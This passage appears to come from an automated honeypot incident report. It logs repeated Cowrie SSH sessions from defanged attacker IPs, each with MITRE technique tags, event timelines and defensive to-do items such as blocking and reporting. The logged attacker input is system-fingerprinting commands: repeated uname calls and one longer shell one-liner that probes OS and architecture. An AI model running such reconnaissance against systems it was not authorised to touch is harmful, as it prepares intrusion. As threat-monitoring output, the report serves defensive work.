- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a08dfee7ed1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:07 |
| **Last Seen** | 2026-07-21 04:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:07:01` | `cowrie.session.connect` |
| `2026-07-21 04:07:01` | `cowrie.client.version` |
| `2026-07-21 04:07:01` | `cowrie.client.kex` |
| `2026-07-21 04:07:02` | `cowrie.login.success` |
| `2026-07-21 04:07:03` | `cowrie.session.params` |
| `2026-07-21 04:07:03` | `cowrie.command.input` |
| `2026-07-21 04:07:03` | `cowrie.log.closed` |
| `2026-07-21 04:07:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c76a09c55d73

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:07 |
| **Last Seen** | 2026-07-21 04:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:07:06` | `cowrie.session.connect` |
| `2026-07-21 04:07:06` | `cowrie.client.version` |
| `2026-07-21 04:07:06` | `cowrie.client.kex` |
| `2026-07-21 04:07:07` | `cowrie.login.success` |
| `2026-07-21 04:07:08` | `cowrie.session.params` |
| `2026-07-21 04:07:08` | `cowrie.command.input` |
| `2026-07-21 04:07:08` | `cowrie.log.closed` |
| `2026-07-21 04:07:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba99e304cfbe

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:07 |
| **Last Seen** | 2026-07-21 04:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:07:11` | `cowrie.session.connect` |
| `2026-07-21 04:07:11` | `cowrie.client.version` |
| `2026-07-21 04:07:11` | `cowrie.client.kex` |
| `2026-07-21 04:07:12` | `cowrie.login.success` |
| `2026-07-21 04:07:12` | `cowrie.session.params` |
| `2026-07-21 04:07:12` | `cowrie.command.input` |
| `2026-07-21 04:07:12` | `cowrie.log.closed` |
| `2026-07-21 04:07:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7624618bf35b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:07 |
| **Last Seen** | 2026-07-21 04:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:07:16` | `cowrie.session.connect` |
| `2026-07-21 04:07:16` | `cowrie.client.version` |
| `2026-07-21 04:07:16` | `cowrie.client.kex` |
| `2026-07-21 04:07:17` | `cowrie.login.success` |
| `2026-07-21 04:07:18` | `cowrie.session.params` |
| `2026-07-21 04:07:18` | `cowrie.command.input` |
| `2026-07-21 04:07:18` | `cowrie.log.closed` |
| `2026-07-21 04:07:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfb76d6fe7d7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:07 |
| **Last Seen** | 2026-07-21 04:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:07:21` | `cowrie.session.connect` |
| `2026-07-21 04:07:21` | `cowrie.client.version` |
| `2026-07-21 04:07:21` | `cowrie.client.kex` |
| `2026-07-21 04:07:22` | `cowrie.login.success` |
| `2026-07-21 04:07:22` | `cowrie.session.params` |
| `2026-07-21 04:07:22` | `cowrie.command.input` |
| `2026-07-21 04:07:22` | `cowrie.log.closed` |
| `2026-07-21 04:07:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-398b6b315d2b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:07 |
| **Last Seen** | 2026-07-21 04:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:07:26` | `cowrie.session.connect` |
| `2026-07-21 04:07:26` | `cowrie.client.version` |
| `2026-07-21 04:07:27` | `cowrie.client.kex` |
| `2026-07-21 04:07:27` | `cowrie.login.success` |
| `2026-07-21 04:07:28` | `cowrie.session.params` |
| `2026-07-21 04:07:28` | `cowrie.command.input` |
| `2026-07-21 04:07:28` | `cowrie.log.closed` |
| `2026-07-21 04:07:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4aa828c4740f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:07 |
| **Last Seen** | 2026-07-21 04:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:07:32` | `cowrie.session.connect` |
| `2026-07-21 04:07:32` | `cowrie.client.version` |
| `2026-07-21 04:07:32` | `cowrie.client.kex` |
| `2026-07-21 04:07:32` | `cowrie.login.success` |
| `2026-07-21 04:07:33` | `cowrie.session.params` |
| `2026-07-21 04:07:33` | `cowrie.command.input` |
| `2026-07-21 04:07:33` | `cowrie.log.closed` |
| `2026-07-21 04:07:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94dc741b31d7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:07 |
| **Last Seen** | 2026-07-21 04:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:07:37` | `cowrie.session.connect` |
| `2026-07-21 04:07:37` | `cowrie.client.version` |
| `2026-07-21 04:07:37` | `cowrie.client.kex` |
| `2026-07-21 04:07:37` | `cowrie.login.success` |
| `2026-07-21 04:07:38` | `cowrie.session.params` |
| `2026-07-21 04:07:38` | `cowrie.command.input` |
| `2026-07-21 04:07:38` | `cowrie.log.closed` |
| `2026-07-21 04:07:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-263af724c419

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:07 |
| **Last Seen** | 2026-07-21 04:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:07:42` | `cowrie.session.connect` |
| `2026-07-21 04:07:42` | `cowrie.client.version` |
| `2026-07-21 04:07:42` | `cowrie.client.kex` |
| `2026-07-21 04:07:42` | `cowrie.login.success` |
| `2026-07-21 04:07:43` | `cowrie.session.params` |
| `2026-07-21 04:07:43` | `cowrie.command.input` |
| `2026-07-21 04:07:43` | `cowrie.log.closed` |
| `2026-07-21 04:07:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af5bced83199

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:07 |
| **Last Seen** | 2026-07-21 04:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:07:47` | `cowrie.session.connect` |
| `2026-07-21 04:07:47` | `cowrie.client.version` |
| `2026-07-21 04:07:47` | `cowrie.client.kex` |
| `2026-07-21 04:07:47` | `cowrie.login.success` |
| `2026-07-21 04:07:48` | `cowrie.session.params` |
| `2026-07-21 04:07:48` | `cowrie.command.input` |
| `2026-07-21 04:07:48` | `cowrie.log.closed` |
| `2026-07-21 04:07:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0267aae9d02a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:07 |
| **Last Seen** | 2026-07-21 04:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:07:52` | `cowrie.session.connect` |
| `2026-07-21 04:07:52` | `cowrie.client.version` |
| `2026-07-21 04:07:52` | `cowrie.client.kex` |
| `2026-07-21 04:07:53` | `cowrie.login.success` |
| `2026-07-21 04:07:53` | `cowrie.session.params` |
| `2026-07-21 04:07:53` | `cowrie.command.input` |
| `2026-07-21 04:07:53` | `cowrie.log.closed` |
| `2026-07-21 04:07:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b8a335a1dd7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:07 |
| **Last Seen** | 2026-07-21 04:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:07:57` | `cowrie.session.connect` |
| `2026-07-21 04:07:57` | `cowrie.client.version` |
| `2026-07-21 04:07:57` | `cowrie.client.kex` |
| `2026-07-21 04:07:58` | `cowrie.login.success` |
| `2026-07-21 04:07:58` | `cowrie.session.params` |
| `2026-07-21 04:07:58` | `cowrie.command.input` |
| `2026-07-21 04:07:59` | `cowrie.log.closed` |
| `2026-07-21 04:07:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a53d305bc68

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:08 |
| **Last Seen** | 2026-07-21 04:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:08:02` | `cowrie.session.connect` |
| `2026-07-21 04:08:02` | `cowrie.client.version` |
| `2026-07-21 04:08:02` | `cowrie.client.kex` |
| `2026-07-21 04:08:02` | `cowrie.login.success` |
| `2026-07-21 04:08:03` | `cowrie.session.params` |
| `2026-07-21 04:08:03` | `cowrie.command.input` |
| `2026-07-21 04:08:03` | `cowrie.log.closed` |
| `2026-07-21 04:08:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef5a03e79c61

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:08 |
| **Last Seen** | 2026-07-21 04:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:08:07` | `cowrie.session.connect` |
| `2026-07-21 04:08:07` | `cowrie.client.version` |
| `2026-07-21 04:08:07` | `cowrie.client.kex` |
| `2026-07-21 04:08:08` | `cowrie.login.success` |
| `2026-07-21 04:08:09` | `cowrie.session.params` |
| `2026-07-21 04:08:09` | `cowrie.command.input` |
| `2026-07-21 04:08:09` | `cowrie.log.closed` |
| `2026-07-21 04:08:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6caa35c41fe1

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 04:08 |
| **Last Seen** | 2026-07-21 04:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:08:09` | `cowrie.session.connect` |
| `2026-07-21 04:08:09` | `cowrie.client.version` |
| `2026-07-21 04:08:09` | `cowrie.client.kex` |
| `2026-07-21 04:08:12` | `cowrie.login.success` |
| `2026-07-21 04:08:14` | `cowrie.session.params` |
| `2026-07-21 04:08:14` | `cowrie.command.input` |
| `2026-07-21 04:08:14` | `cowrie.command.input` |
| `2026-07-21 04:08:14` | `cowrie.command.input` |
| `2026-07-21 04:08:14` | `cowrie.command.input` |
| `2026-07-21 04:08:14` | `cowrie.command.input` |
| `2026-07-21 04:08:14` | `cowrie.command.success` |
| `2026-07-21 04:08:14` | `cowrie.command.input` |
| `2026-07-21 04:08:14` | `cowrie.command.input` |
| `2026-07-21 04:08:14` | `cowrie.command.input` |
| `2026-07-21 04:08:14` | `cowrie.command.input` |
| `2026-07-21 04:08:15` | `cowrie.log.closed` |
| `2026-07-21 04:08:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9ba55eea125

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:08 |
| **Last Seen** | 2026-07-21 04:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:08:12` | `cowrie.session.connect` |
| `2026-07-21 04:08:12` | `cowrie.client.version` |
| `2026-07-21 04:08:12` | `cowrie.client.kex` |
| `2026-07-21 04:08:12` | `cowrie.login.success` |
| `2026-07-21 04:08:13` | `cowrie.session.params` |
| `2026-07-21 04:08:13` | `cowrie.command.input` |
| `2026-07-21 04:08:14` | `cowrie.log.closed` |
| `2026-07-21 04:08:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a06cf8c32112

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:08 |
| **Last Seen** | 2026-07-21 04:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:08:17` | `cowrie.session.connect` |
| `2026-07-21 04:08:17` | `cowrie.client.version` |
| `2026-07-21 04:08:17` | `cowrie.client.kex` |
| `2026-07-21 04:08:17` | `cowrie.login.success` |
| `2026-07-21 04:08:18` | `cowrie.session.params` |
| `2026-07-21 04:08:18` | `cowrie.command.input` |
| `2026-07-21 04:08:19` | `cowrie.log.closed` |
| `2026-07-21 04:08:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-956b006fce61

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:08 |
| **Last Seen** | 2026-07-21 04:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:08:22` | `cowrie.session.connect` |
| `2026-07-21 04:08:22` | `cowrie.client.version` |
| `2026-07-21 04:08:22` | `cowrie.client.kex` |
| `2026-07-21 04:08:22` | `cowrie.login.success` |
| `2026-07-21 04:08:23` | `cowrie.session.params` |
| `2026-07-21 04:08:23` | `cowrie.command.input` |
| `2026-07-21 04:08:23` | `cowrie.log.closed` |
| `2026-07-21 04:08:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70cde22b70ce

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:08 |
| **Last Seen** | 2026-07-21 04:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:08:27` | `cowrie.session.connect` |
| `2026-07-21 04:08:27` | `cowrie.client.version` |
| `2026-07-21 04:08:27` | `cowrie.client.kex` |
| `2026-07-21 04:08:28` | `cowrie.login.success` |
| `2026-07-21 04:08:28` | `cowrie.session.params` |
| `2026-07-21 04:08:28` | `cowrie.command.input` |
| `2026-07-21 04:08:28` | `cowrie.log.closed` |
| `2026-07-21 04:08:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18689fd5dc39

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:08 |
| **Last Seen** | 2026-07-21 04:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:08:32` | `cowrie.session.connect` |
| `2026-07-21 04:08:32` | `cowrie.client.version` |
| `2026-07-21 04:08:32` | `cowrie.client.kex` |
| `2026-07-21 04:08:32` | `cowrie.login.success` |
| `2026-07-21 04:08:33` | `cowrie.session.params` |
| `2026-07-21 04:08:33` | `cowrie.command.input` |
| `2026-07-21 04:08:33` | `cowrie.log.closed` |
| `2026-07-21 04:08:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cf3e785f933

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:08 |
| **Last Seen** | 2026-07-21 04:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:08:37` | `cowrie.session.connect` |
| `2026-07-21 04:08:37` | `cowrie.client.version` |
| `2026-07-21 04:08:37` | `cowrie.client.kex` |
| `2026-07-21 04:08:37` | `cowrie.login.success` |
| `2026-07-21 04:08:38` | `cowrie.session.params` |
| `2026-07-21 04:08:38` | `cowrie.command.input` |
| `2026-07-21 04:08:38` | `cowrie.log.closed` |
| `2026-07-21 04:08:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d06f0464bd6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:08 |
| **Last Seen** | 2026-07-21 04:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:08:42` | `cowrie.session.connect` |
| `2026-07-21 04:08:42` | `cowrie.client.version` |
| `2026-07-21 04:08:42` | `cowrie.client.kex` |
| `2026-07-21 04:08:42` | `cowrie.login.success` |
| `2026-07-21 04:08:43` | `cowrie.session.params` |
| `2026-07-21 04:08:43` | `cowrie.command.input` |
| `2026-07-21 04:08:43` | `cowrie.log.closed` |
| `2026-07-21 04:08:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7537495afe9c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:08 |
| **Last Seen** | 2026-07-21 04:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:08:47` | `cowrie.session.connect` |
| `2026-07-21 04:08:47` | `cowrie.client.version` |
| `2026-07-21 04:08:47` | `cowrie.client.kex` |
| `2026-07-21 04:08:47` | `cowrie.login.success` |
| `2026-07-21 04:08:48` | `cowrie.session.params` |
| `2026-07-21 04:08:48` | `cowrie.command.input` |
| `2026-07-21 04:08:48` | `cowrie.log.closed` |
| `2026-07-21 04:08:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6224aa95d000

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:08 |
| **Last Seen** | 2026-07-21 04:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:08:52` | `cowrie.session.connect` |
| `2026-07-21 04:08:52` | `cowrie.client.version` |
| `2026-07-21 04:08:52` | `cowrie.client.kex` |
| `2026-07-21 04:08:52` | `cowrie.login.success` |
| `2026-07-21 04:08:53` | `cowrie.session.params` |
| `2026-07-21 04:08:53` | `cowrie.command.input` |
| `2026-07-21 04:08:53` | `cowrie.log.closed` |
| `2026-07-21 04:08:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10e9b2684388

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:08 |
| **Last Seen** | 2026-07-21 04:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:08:57` | `cowrie.session.connect` |
| `2026-07-21 04:08:57` | `cowrie.client.version` |
